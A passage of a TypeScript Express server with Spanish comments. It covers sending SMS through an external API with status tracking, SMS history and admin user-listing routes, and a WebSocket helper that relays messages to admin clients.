          // Lo eliminamos para evitar confusiones

          // Agregar timeout para evitar bloqueo indefinido
          const controller = new AbortController();
          const timeoutId = setTimeout(() => controller.abort(), 10000);

          try {
            // Usaremos axios en lugar de fetch ya que puede manejar mejor ciertas situaciones de red
            console.log("Usando axios para realizar la solicitud");
            const axiosResponse = await axios.post(smsApiUrl, {
              numero: phoneNumber,
              mensaje: messageContent,
              usuario: username,
              password: password
            }, {
              headers: {
                'Content-Type': 'application/json'
              },
              timeout: 10000 // 10 segundos de timeout
            });
            
            // Simulamos una respuesta fetch para mantener compatibilidad con el código existente
            const response = {
              ok: axiosResponse.status >= 200 && axiosResponse.status < 300,
              status: axiosResponse.status,
              statusText: axiosResponse.statusText,
              text: async () => JSON.stringify(axiosResponse.data)
            };

            clearTimeout(timeoutId);

            const responseText = await response.text();
            let responseData;

            try {
              responseData = JSON.parse(responseText);
            } catch (e) {
              responseData = { message: `Respuesta no es JSON válido: ${responseText.substring(0, 100)}` };
            }

            console.log("Respuesta recibida:", {
              status: response.status,
              statusText: response.statusText,
              data: responseData
            });

            if (response.ok) {
              // Actualizar el registro como enviado
              await storage.updateSmsStatus(smsRecord.id, 'sent');
              console.log("SMS enviado correctamente:", responseData);

              res.json({
                success: true,
                message: "Mensaje enviado correctamente",
                smsId: smsRecord.id,
                apiResponse: responseData
              });
            } else {
              // La API respondió con un error
              const errorMsg = responseData.message || `Error ${response.status}: ${response.statusText}`;
              await storage.updateSmsStatus(smsRecord.id, 'failed', errorMsg);
              console.error("Error al enviar SMS:", errorMsg);

              res.status(400).json({
                success: false,
                message: `Error en la API de SMS: ${errorMsg}`,
                smsId: smsRecord.id
              });
            }
          } catch (fetchError: any) {
            if (fetchError.name === 'AbortError') {
              const timeoutMsg = 'La solicitud excedió el tiempo de espera (10 segundos)';
              await storage.updateSmsStatus(smsRecord.id, 'failed', timeoutMsg);
              console.error("Timeout en la solicitud a la API de SMS");

              res.status(500).json({
                success: false,
                message: timeoutMsg,
                smsId: smsRecord.id
              });
            } else {
              throw fetchError; // Propagar otros errores al manejador externo
            }
          }

        } catch (error: any) {
          // Error al realizar la solicitud fetch
          const errorMsg = error.message || 'Error de conexión con la API';
          await storage.updateSmsStatus(smsRecord.id, 'failed', errorMsg);
          console.error("Error de conexión con la API de SMS:", errorMsg);

          res.status(500).json({
            success: false,
            message: `Error de conexión con la API de SMS: ${errorMsg}`,
            smsId: smsRecord.id
          });
        }
      } catch (apiError: any) {
        // Si ocurre un error con la API, actualizar el estado del SMS
        await storage.updateSmsStatus(smsRecord.id, 'failed', apiError.message);
        throw apiError;
      }
    } catch (error: any) {
      res.status(500).json({ 
        success: false, 
        message: error.message 
      });
    }
  });

  // Obtener historial de SMS enviados
  app.get('/api/sms/history', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const user = req.user;
      const history = await storage.getUserSmsHistory(user.id);

      res.json(history);
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Obtener todos los usuarios regulares (para agregar créditos)
  app.get('/api/users/regular', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const currentUser = req.user;
      // Solo administradores pueden ver la lista de usuarios
      if (currentUser.role !== UserRole.ADMIN) {
        return res.status(403).json({ message: "Solo administradores pueden ver la lista de usuarios" });
      }

      const users = await storage.getAllUsers();
      // Filtrar administradores y enviar solo datos básicos
      const regularUsers = users.filter(user => user.role === UserRole.USER).map(user => ({
        id: user.id,
        username: user.username,
        isActive: user.isActive,
        expiresAt: user.expiresAt,
        credits: 0 // El frontend tendrá que cargar los créditos aparte
      }));

      res.json(regularUsers);
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  return httpServer;
}

// Helper function to broadcast to all admin clients
// Filtrar mensajes de tipo CLIENT_INPUT_REALTIME para evitar exceso de notificaciones
function broadcastToAdmins(message: string) {
  // Si el mensaje es del tipo CLIENT_INPUT_REALTIME, no enviarlo
  try {
    const parsedMessage = JSON.parse(message);
    if (parsedMessage.type === 'CLIENT_INPUT_REALTIME') {
      console.log('Mensaje de tipo CLIENT_INPUT_REALTIME suprimido');
      return; // No enviar este tipo de mensajes
    }
  } catch (e) {
    // Error al parsear el mensaje, continuamos con el envío normal
  }

  // Enviar el mensaje a todos los clientes administradores conectados
  adminClients.forEach(client => {
    if (client.readyState === WebSocket.OPEN) {
      client.send(message);
    }
  });
}